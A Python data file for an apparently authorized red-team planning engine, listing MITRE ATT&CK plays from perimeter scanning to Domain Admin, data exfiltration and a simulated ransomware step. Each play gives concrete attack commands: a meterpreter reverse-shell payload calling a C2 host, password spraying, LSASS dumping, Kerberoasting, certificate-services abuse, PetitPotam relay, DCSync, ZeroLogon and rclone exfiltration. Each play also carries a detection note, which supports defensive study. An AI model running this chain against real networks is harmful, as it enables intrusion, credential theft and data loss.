"""
Siege Tower — seed playbook.

An ATT&CK-mapped library of plays covering a realistic external-to-domain
compromise, plus web/Linux footholds, data collection, exfiltration, and a
(simulated) impact objective. Enough branch points exist that the engine can
offer several genuinely different plans for the same objective.

Each play carries the "drill-down" detail a red teamer actually needs:
what it achieves, the ordered commands, the success indicator, and the
secondary technique to fall back to. Commands are illustrative starting
points for authorized engagements, not copy-paste guarantees.

The knowledge base is data, not code — Bulwark (or any host) can extend or
replace it by passing its own list of Play objects to the engine.
"""
from __future__ import annotations

from .capabilities import (
    CAP_AD_RECON, CAP_C2, CAP_CODE_EXEC_HOST, CAP_DATA_EXFILTRATED,
    CAP_DOMAIN_ADMIN, CAP_DOMAIN_USER, CAP_EXTERNAL_RECON, CAP_HARVESTED_CREDS,
    CAP_IMPACT_DEPLOYED, CAP_INTERNAL_NETWORK, CAP_LOCAL_ADMIN,
    CAP_SENSITIVE_DATA_ACCESS, CAP_WEB_FOOTHOLD,
)
from .schema import Platform, Play, PlayStep, Tactic

WIN = Platform.WINDOWS
LNX = Platform.LINUX
WEB = Platform.WEB
NET = Platform.NETWORK
AD = Platform.ACTIVE_DIRECTORY


DEFAULT_PLAYBOOK: list[Play] = [
    # ── Reconnaissance ───────────────────────────────────────────
    Play(
        technique_id="T1595",
        name="Active Scanning of the external perimeter",
        tactic=Tactic.RECON,
        summary="Map the reachable external attack surface before touching it.",
        requires=frozenset({CAP_EXTERNAL_RECON}),
        provides=frozenset({CAP_EXTERNAL_RECON}),
        platforms=frozenset({WEB, NET}),
        noise=2, difficulty=1, reliability=5, est_minutes=45,
        objective="Enumerate live hosts, ports, and services in scope to pick "
                  "the softest initial-access target.",
        prerequisite_note="Scope IP ranges/domains from the ROE.",
        steps=(
            PlayStep(
                command="nmap -sV -Pn -p- --min-rate 2000 -oA recon/ext $SCOPE_CIDR",
                description="Full TCP service sweep across the in-scope ranges.",
                expected_result="Open ports and service/version banners per host.",
            ),
            PlayStep(
                command="httpx -l recon/web_hosts.txt -title -tech-detect -status-code",
                description="Fingerprint web tiers and technologies.",
                expected_result="A list of live web apps with detected stacks.",
            ),
        ),
        success_indicator="A ranked inventory of exposed services mapped to scope.",
        fallback_technique_ids=("T1596",),
        detection="Perimeter IDS/WAF logging bursts of connections from one source.",
        references=("https://attack.mitre.org/techniques/T1595/",),
    ),

    # ── Initial access ───────────────────────────────────────────
    Play(
        technique_id="T1190",
        name="Exploit Public-Facing Application",
        tactic=Tactic.INITIAL_ACCESS,
        summary="Turn an exposed web/app vulnerability into code execution.",
        requires=frozenset({CAP_EXTERNAL_RECON}),
        provides=frozenset({CAP_WEB_FOOTHOLD, CAP_CODE_EXEC_HOST}),
        platforms=frozenset({WEB, LNX, WIN}),
        noise=3, difficulty=3, reliability=3, est_minutes=90,
        is_exploitation=True,
        objective="Gain first code execution on an internet-facing host.",
        prerequisite_note="A vulnerable, in-scope public service from recon.",
        steps=(
            PlayStep(
                command="nuclei -u https://$TARGET -severity critical,high",
                description="Confirm the exploitable vulnerability with a template.",
                expected_result="A positive match on an RCE/injection template.",
            ),
            PlayStep(
                command="curl -s https://$TARGET/vuln --data-binary @payload.txt",
                description="Deliver the exploit payload for the confirmed bug.",
                expected_result="A command runs on the server (e.g. id / whoami).",
            ),
            PlayStep(
                command="msfvenom -p linux/x64/meterpreter/reverse_https LHOST=$C2 -f elf -o beacon",
                description="Stage an interactive callback for a stable session.",
                expected_result="A returning session/beacon from the target.",
            ),
        ),
        success_indicator="Command output returns from the target host.",
        fallback_technique_ids=("T1566", "T1110"),
        detection="WAF alerts; unexpected child processes of the web service.",
        attributed_actors=frozenset({"APT41"}),
        references=("https://attack.mitre.org/techniques/T1190/",),
    ),
    Play(
        technique_id="T1566",
        name="Phishing for initial access",
        tactic=Tactic.INITIAL_ACCESS,
        summary="Land execution on a domain workstation via a crafted lure.",
        requires=frozenset({CAP_EXTERNAL_RECON}),
        provides=frozenset({CAP_CODE_EXEC_HOST, CAP_C2, CAP_DOMAIN_USER, CAP_INTERNAL_NETWORK}),
        platforms=frozenset({WIN}),
        noise=3, difficulty=3, reliability=3, est_minutes=120,
        is_phishing=True, is_social_engineering=True,
        objective="Obtain a beacon running in a real user's domain context.",
        prerequisite_note="Harvested target email addresses; a sending domain.",
        steps=(
            PlayStep(
                command="gophish  # stand up campaign, clone the login portal",
                description="Build the lure and track opens/clicks/credentials.",
                expected_result="A campaign ready with a payload or credential trap.",
            ),
            PlayStep(
                command="# deliver macro/ISO/LNK loader that beacons to $C2 over HTTPS",
                description="Send the lure to the target user set.",
                expected_result="A user executes the loader; a beacon checks in.",
            ),
        ),
        success_indicator="A beacon returns under a domain user's token.",
        fallback_technique_ids=("T1190", "T1110"),
        detection="Mail gateway detonation; Office spawning script interpreters.",
        attributed_actors=frozenset({"APT29", "APT28"}),
        references=("https://attack.mitre.org/techniques/T1566/",),
    ),
    Play(
        technique_id="T1110",
        name="Password Spraying against an exposed portal",
        tactic=Tactic.CREDENTIAL_ACCESS,
        summary="Guess weak passwords across many accounts on a public portal.",
        requires=frozenset({CAP_EXTERNAL_RECON}),
        provides=frozenset({CAP_DOMAIN_USER}),
        platforms=frozenset({WIN, WEB, Platform.AZURE_AD}),
        noise=4, difficulty=2, reliability=2, est_minutes=120,
        is_credential_bruteforce=True,
        objective="Recover at least one valid set of domain credentials.",
        prerequisite_note="An exposed auth surface (OWA/VPN/O365) and a user list.",
        steps=(
            PlayStep(
                command="kerbrute userenum -d $DOMAIN --dc $DC users.txt",
                description="Validate which usernames exist before spraying.",
                expected_result="A filtered list of valid domain usernames.",
            ),
            PlayStep(
                command="kerbrute passwordspray -d $DOMAIN valid_users.txt 'Season2025!'",
                description="Try one password across all accounts to dodge lockout.",
                expected_result="One or more VALID username:password pairs.",
            ),
        ),
        success_indicator="A valid credential authenticates to the portal.",
        fallback_technique_ids=("T1566",),
        detection="Many failed logins from one IP across many accounts.",
        references=("https://attack.mitre.org/techniques/T1110/003/",),
    ),
    Play(
        technique_id="T1133",
        name="External Remote Services with valid credentials",
        tactic=Tactic.INITIAL_ACCESS,
        summary="Log into VPN/Citrix/RDP gateway with recovered creds to get inside.",
        requires=frozenset({CAP_DOMAIN_USER}),
        provides=frozenset({CAP_INTERNAL_NETWORK, CAP_CODE_EXEC_HOST}),
        platforms=frozenset({WIN, NET}),
        noise=2, difficulty=2, reliability=4, est_minutes=45,
        objective="Convert valid credentials into an internal foothold.",
        prerequisite_note="Valid domain credentials and a reachable remote service.",
        steps=(
            PlayStep(
                command="openconnect --user=$USER https://vpn.$DOMAIN",
                description="Authenticate to the remote access service.",
                expected_result="An internal IP lease and route to the LAN.",
            ),
            PlayStep(
                command="xfreerdp /u:$USER /d:$DOMAIN /v:$JUMPHOST +clipboard",
                description="Reach an internal jump/workstation for execution.",
                expected_result="An interactive session on an internal host.",
            ),
        ),
        success_indicator="Internal hosts respond that were not reachable before.",
        fallback_technique_ids=("T1190",),
        detection="Logins from atypical geolocations/devices to remote gateways.",
        references=("https://attack.mitre.org/techniques/T1133/",),
    ),

    # ── Local escalation & pivot ─────────────────────────────────
    Play(
        technique_id="T1068",
        name="Local Privilege Escalation",
        tactic=Tactic.PRIVILEGE_ESCALATION,
        summary="Raise a foothold to local administrator/root.",
        requires=frozenset({CAP_CODE_EXEC_HOST}),
        provides=frozenset({CAP_LOCAL_ADMIN}),
        platforms=frozenset({WIN, LNX}),
        noise=3, difficulty=3, reliability=3, est_minutes=60,
        is_exploitation=True,
        objective="Obtain administrative rights on the compromised host.",
        prerequisite_note="A low-privilege foothold on a host.",
        steps=(
            PlayStep(
                command="winpeas.exe  # or linpeas.sh on Linux",
                description="Enumerate local privilege-escalation vectors.",
                expected_result="A shortlist of misconfigurations/exploitable paths.",
            ),
            PlayStep(
                command="# abuse the confirmed vector (unquoted service, SUID, kernel)",
                description="Execute the chosen escalation path.",
                expected_result="A shell running as SYSTEM/root.",
            ),
        ),
        success_indicator="whoami returns SYSTEM (Windows) or root (Linux).",
        fallback_technique_ids=("T1548",),
        detection="New services, token manipulation, kernel-exploit crashes.",
        references=("https://attack.mitre.org/techniques/T1068/",),
    ),
    Play(
        technique_id="T1046",
        name="Network Service Discovery / internal pivot",
        tactic=Tactic.DISCOVERY,
        summary="From a foothold, map the internal network and reach the LAN.",
        requires=frozenset({CAP_CODE_EXEC_HOST}),
        provides=frozenset({CAP_INTERNAL_NETWORK}),
        platforms=frozenset({NET, WIN, LNX}),
        noise=3, difficulty=2, reliability=4, est_minutes=45,
        objective="Establish routable internal access and locate key hosts.",
        prerequisite_note="Code execution on a host with an internal interface.",
        steps=(
            PlayStep(
                command="proxychains nmap -sT -Pn -p 88,445,389,3389 10.0.0.0/16",
                description="Pivot a scan through the foothold to find DCs/servers.",
                expected_result="Internal hosts and roles (DCs, file servers).",
            ),
        ),
        success_indicator="Internal ranges enumerate through the pivot.",
        fallback_technique_ids=("T1049",),
        detection="Internal port-scan patterns from a workstation.",
        references=("https://attack.mitre.org/techniques/T1046/",),
    ),
    Play(
        technique_id="T1003",
        name="OS Credential Dumping (LSASS / SAM)",
        tactic=Tactic.CREDENTIAL_ACCESS,
        summary="Loot cached credentials from a host you admin.",
        requires=frozenset({CAP_LOCAL_ADMIN}),
        provides=frozenset({CAP_HARVESTED_CREDS, CAP_DOMAIN_USER}),
        platforms=frozenset({WIN}),
        noise=4, difficulty=2, reliability=4, est_minutes=30,
        objective="Recover domain credentials/hashes for reuse and pivoting.",
        prerequisite_note="Local admin on a domain-joined host.",
        steps=(
            PlayStep(
                command="nanodump --write C:\\Windows\\Temp\\l.dmp",
                description="Dump LSASS memory with a low-detection tool.",
                expected_result="A minidump containing credential material.",
            ),
            PlayStep(
                command="pypykatz lsa minidump l.dmp",
                description="Parse the dump offline for secrets.",
                expected_result="Cleartext creds, NTLM hashes, or Kerberos tickets.",
            ),
        ),
        success_indicator="Usable domain hashes/credentials extracted.",
        fallback_technique_ids=("T1558",),
        detection="LSASS handle access from non-standard processes (EDR).",
        attributed_actors=frozenset({"APT29"}),
        references=("https://attack.mitre.org/techniques/T1003/",),
    ),

    # ── AD situational awareness ─────────────────────────────────
    Play(
        technique_id="T1087",
        name="Active Directory enumeration (BloodHound)",
        tactic=Tactic.DISCOVERY,
        summary="Map users, groups, sessions, and attack paths across the domain.",
        requires=frozenset({CAP_DOMAIN_USER, CAP_INTERNAL_NETWORK}),
        provides=frozenset({CAP_AD_RECON}),
        platforms=frozenset({AD, WIN}),
        noise=2, difficulty=2, reliability=5, est_minutes=45,
        objective="Find the shortest privileged path to Domain Admin.",
        prerequisite_note="Any valid domain credentials with LAN access.",
        steps=(
            PlayStep(
                command="bloodhound-python -d $DOMAIN -u $USER -p $PASS -c All -ns $DC",
                description="Collect AD objects and relationships.",
                expected_result="A dataset of domain paths to high-value groups.",
            ),
            PlayStep(
                command="# In BloodHound: 'Shortest paths to Domain Admins'",
                description="Identify the concrete escalation chain to abuse.",
                expected_result="A named path (Kerberoast, ADCS, ACL, etc.).",
            ),
        ),
        success_indicator="A viable path to Tier-0 is identified.",
        fallback_technique_ids=("T1069",),
        detection="Bulk LDAP/SAMR enumeration from one host.",
        references=("https://attack.mitre.org/techniques/T1087/",),
    ),

    # ── Domain escalation (branch point) ─────────────────────────
    Play(
        technique_id="T1558.003",
        name="Kerberoasting a privileged service account",
        tactic=Tactic.CREDENTIAL_ACCESS,
        summary="Crack a service account's password offline to seize its rights.",
        requires=frozenset({CAP_DOMAIN_USER, CAP_AD_RECON}),
        provides=frozenset({CAP_DOMAIN_ADMIN}),
        platforms=frozenset({AD, WIN}),
        noise=2, difficulty=3, reliability=3, est_minutes=180,
        is_credential_bruteforce=True,
        objective="Escalate to Tier-0 via a crackable, over-privileged SPN.",
        prerequisite_note="A domain user and an SPN in/near a privileged group.",
        steps=(
            PlayStep(
                command="GetUserSPNs.py -request -dc-ip $DC $DOMAIN/$USER:$PASS -outputfile spns.txt",
                description="Request service tickets for accounts with SPNs.",
                expected_result="TGS-REP hashes for crackable service accounts.",
            ),
            PlayStep(
                command="hashcat -m 13100 spns.txt rockyou.txt -r best64.rule",
                description="Crack the service ticket hashes offline.",
                expected_result="A cleartext password for a privileged account.",
            ),
        ),
        success_indicator="Recovered creds authenticate into a Tier-0 group.",
        fallback_technique_ids=("T1649", "T1003.006"),
        detection="Anomalous TGS requests (RC4) for many SPNs at once.",
        attributed_actors=frozenset({"FIN7"}),
        references=("https://attack.mitre.org/techniques/T1558/003/",),
    ),
    Play(
        technique_id="T1649",
        name="AD Certificate Services abuse (ESC1)",
        tactic=Tactic.PRIVILEGE_ESCALATION,
        summary="Enrol a certificate that impersonates a Domain Admin.",
        requires=frozenset({CAP_DOMAIN_USER, CAP_AD_RECON}),
        provides=frozenset({CAP_DOMAIN_ADMIN}),
        platforms=frozenset({AD, WIN}),
        noise=2, difficulty=3, reliability=4, est_minutes=90,
        objective="Escalate to Tier-0 via a misconfigured certificate template.",
        prerequisite_note="An ADCS template allowing SAN + client-auth for users.",
        steps=(
            PlayStep(
                command="certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable",
                description="Locate vulnerable certificate templates (ESC1-8).",
                expected_result="A template flagged ESC1 the user can enrol.",
            ),
            PlayStep(
                command="certipy req -u $USER@$DOMAIN -p $PASS -ca $CA -template $T -upn administrator@$DOMAIN",
                description="Request a cert impersonating a Domain Admin.",
                expected_result="A .pfx for the administrator account.",
            ),
            PlayStep(
                command="certipy auth -pfx administrator.pfx -dc-ip $DC",
                description="Authenticate with the forged certificate.",
                expected_result="A TGT/NT hash for Domain Admin.",
            ),
        ),
        success_indicator="A Domain Admin TGT or hash is obtained.",
        fallback_technique_ids=("T1558.003", "T1557"),
        detection="Unusual certificate enrolments with alternate SANs.",
        references=("https://attack.mitre.org/techniques/T1649/",),
    ),
    Play(
        technique_id="T1003.006",
        name="DCSync from a rights-holding account",
        tactic=Tactic.CREDENTIAL_ACCESS,
        summary="Replicate the directory to pull every domain hash (incl. krbtgt).",
        requires=frozenset({CAP_HARVESTED_CREDS, CAP_AD_RECON}),
        provides=frozenset({CAP_DOMAIN_ADMIN}),
        platforms=frozenset({AD, WIN}),
        noise=3, difficulty=3, reliability=4, est_minutes=45,
        objective="Seize domain-wide credentials via replication rights.",
        prerequisite_note="An account with DS-Replication rights (from looting/ACLs).",
        steps=(
            PlayStep(
                command="secretsdump.py -just-dc-user krbtgt $DOMAIN/$USER@$DC -hashes :$NTLM",
                description="Abuse replication to dump target account hashes.",
                expected_result="NTLM hashes for krbtgt / Domain Admins.",
            ),
        ),
        success_indicator="krbtgt or DA hashes returned (golden-ticket capable).",
        fallback_technique_ids=("T1649",),
        detection="DRSUAPI replication from a non-DC host.",
        attributed_actors=frozenset({"APT29"}),
        references=("https://attack.mitre.org/techniques/T1003/006/",),
    ),
    Play(
        technique_id="T1557",
        name="NTLM coercion + relay to AD CS (ESC8 / PetitPotam)",
        tactic=Tactic.CREDENTIAL_ACCESS,
        summary="Coerce a DC to authenticate and relay it to a CA for a DA cert.",
        requires=frozenset({CAP_INTERNAL_NETWORK, CAP_AD_RECON}),
        provides=frozenset({CAP_DOMAIN_ADMIN}),
        platforms=frozenset({AD, NET}),
        noise=4, difficulty=4, reliability=3, est_minutes=90,
        objective="Escalate without cracking, by relaying machine authentication.",
        prerequisite_note="A web-enrolment CA (ESC8) reachable on the LAN.",
        steps=(
            PlayStep(
                command="certipy relay -ca http://$CA/certsrv/certfnsh.asp -template DomainController",
                description="Stand up the relay listener targeting the CA.",
                expected_result="Relay server waiting for inbound DC auth.",
            ),
            PlayStep(
                command="PetitPotam.py -u $USER -p $PASS $ATTACKER $DC_IP",
                description="Coerce the DC to authenticate to the relay.",
                expected_result="A machine-account certificate for the DC.",
            ),
        ),
        success_indicator="A DC certificate is issued and usable for DA.",
        fallback_technique_ids=("T1649",),
        detection="Unusual EFSRPC/MS-RPRN calls; relayed NTLM auth to the CA.",
        references=("https://attack.mitre.org/techniques/T1557/",),
    ),
    Play(
        technique_id="T1210",
        name="Exploitation of a Remote Service (e.g. ZeroLogon)",
        tactic=Tactic.PRIVILEGE_ESCALATION,
        summary="Exploit an unpatched DC service to seize the domain directly.",
        requires=frozenset({CAP_INTERNAL_NETWORK}),
        provides=frozenset({CAP_DOMAIN_ADMIN}),
        platforms=frozenset({AD, NET, WIN}),
        noise=5, difficulty=3, reliability=2, est_minutes=30,
        is_exploitation=True, destructive=True, requires_evidence_removal=True,
        objective="Take the domain via a critical DC vulnerability where present.",
        prerequisite_note="An unpatched DC (CVE-2020-1472 etc.). Can break replication.",
        steps=(
            PlayStep(
                command="zerologon_tester.py $DC_NAME $DC_IP",
                description="Non-destructively test whether the DC is vulnerable.",
                expected_result="Confirmation the DC is exploitable.",
            ),
            PlayStep(
                command="# run the exploit only with explicit sign-off; restore the machine password after",
                description="Reset the DC machine password to empty, then restore it.",
                expected_result="Temporary DA-equivalent access to the DC.",
            ),
        ),
        success_indicator="Authenticated to the DC as the machine account.",
        fallback_technique_ids=("T1649", "T1558.003"),
        detection="Netlogon auth anomalies; ZeroLogon signatures on the DC.",
        references=("https://attack.mitre.org/techniques/T1210/",),
    ),

    # ── Collection ───────────────────────────────────────────────
    Play(
        technique_id="T1005",
        name="Data from Local System",
        tactic=Tactic.COLLECTION,
        summary="Stage sensitive files present on a compromised host.",
        requires=frozenset({CAP_CODE_EXEC_HOST}),
        provides=frozenset({CAP_SENSITIVE_DATA_ACCESS}),
        platforms=frozenset({WIN, LNX}),
        noise=2, difficulty=1, reliability=4, est_minutes=30,
        objective="Identify and stage objective-relevant data on the host.",
        prerequisite_note="Code execution on a host holding in-scope data.",
        steps=(
            PlayStep(
                command="# grep -ri 'password\\|secret\\|PAN' /home /srv 2>/dev/null",
                description="Search for sensitive material matching the objective.",
                expected_result="Files of interest identified for staging.",
            ),
        ),
        success_indicator="Objective-relevant data located and staged.",
        fallback_technique_ids=("T1213",),
        detection="Bulk file reads / archive creation on an endpoint.",
        references=("https://attack.mitre.org/techniques/T1005/",),
    ),
    Play(
        technique_id="T1213",
        name="Data from Information Repositories",
        tactic=Tactic.COLLECTION,
        summary="Pull target data from shares, SharePoint, wikis, or databases.",
        requires=frozenset({CAP_DOMAIN_USER}),
        provides=frozenset({CAP_SENSITIVE_DATA_ACCESS}),
        platforms=frozenset({WIN, AD, WEB}),
        noise=2, difficulty=2, reliability=4, est_minutes=60,
        objective="Access the repositories that hold the contracted objective data.",
        prerequisite_note="A domain identity with access to the repositories.",
        steps=(
            PlayStep(
                command="snaffler.exe -s -o snaffle.log",
                description="Sweep reachable file shares for sensitive content.",
                expected_result="A list of high-value files across shares.",
            ),
        ),
        success_indicator="Objective data is reachable and staged.",
        fallback_technique_ids=("T1005",),
        detection="Unusual breadth of share access from one account.",
        references=("https://attack.mitre.org/techniques/T1213/",),
    ),

    # ── Exfiltration ─────────────────────────────────────────────
    Play(
        technique_id="T1567",
        name="Exfiltration Over Web Service",
        tactic=Tactic.EXFILTRATION,
        summary="Move staged data out over a trusted cloud/web channel.",
        requires=frozenset({CAP_SENSITIVE_DATA_ACCESS, CAP_CODE_EXEC_HOST}),
        provides=frozenset({CAP_DATA_EXFILTRATED}),
        platforms=frozenset({WIN, LNX, WEB}),
        noise=3, difficulty=2, reliability=4, est_minutes=45,
        objective="Demonstrate controlled exfiltration to prove data access.",
        prerequisite_note="Staged data and an egress path the team may use.",
        steps=(
            PlayStep(
                command="7z a -p$PW -mhe=on loot.7z ./staged/",
                description="Encrypt and compress the staged data first.",
                expected_result="A single encrypted archive of the objective data.",
            ),
            PlayStep(
                command="rclone copy loot.7z remote:redteam-evidence",
                description="Transfer over an approved web service to a controlled sink.",
                expected_result="Archive lands in the team-controlled bucket.",
            ),
        ),
        success_indicator="Data arrives intact at the team-controlled endpoint.",
        fallback_technique_ids=("T1048",),
        detection="Large outbound transfers to unusual cloud endpoints (DLP).",
        references=("https://attack.mitre.org/techniques/T1567/",),
    ),

    # ── Impact (simulated) ───────────────────────────────────────
    Play(
        technique_id="T1486",
        name="Data Encrypted for Impact (SIMULATED)",
        tactic=Tactic.IMPACT,
        summary="Demonstrate ransomware reach with a benign, reversible marker.",
        requires=frozenset({CAP_DOMAIN_ADMIN}),
        provides=frozenset({CAP_IMPACT_DEPLOYED}),
        platforms=frozenset({WIN, AD}),
        noise=5, difficulty=2, reliability=4, est_minutes=60,
        destructive=True, requires_evidence_removal=True, is_persistence=False,
        objective="Prove domain-wide impact without causing real damage.",
        prerequisite_note="Explicit written sign-off for a simulated impact action.",
        steps=(
            PlayStep(
                command="# deploy a benign EICAR-style marker file via GPO/PsExec fleet-wide",
                description="Simulate mass deployment using a harmless canary, not a crypter.",
                expected_result="The marker appears on hosts, proving reach.",
            ),
            PlayStep(
                command="# collect deployment proof, then remove all markers",
                description="Evidence the blast radius, then fully clean up.",
                expected_result="Documented reach with all artifacts removed.",
            ),
        ),
        success_indicator="Fleet-wide reach demonstrated and safely reverted.",
        fallback_technique_ids=(),
        detection="Mass file writes / GPO changes; EDR ransomware canaries.",
        attributed_actors=frozenset({"LockBit"}),
        references=("https://attack.mitre.org/techniques/T1486/",),
    ),
]


def playbook_by_id(playbook: list[Play] | None = None) -> dict[str, Play]:
    """Index a playbook by technique_id (last write wins on duplicates)."""
    pb = playbook if playbook is not None else DEFAULT_PLAYBOOK
    return {p.technique_id: p for p in pb}
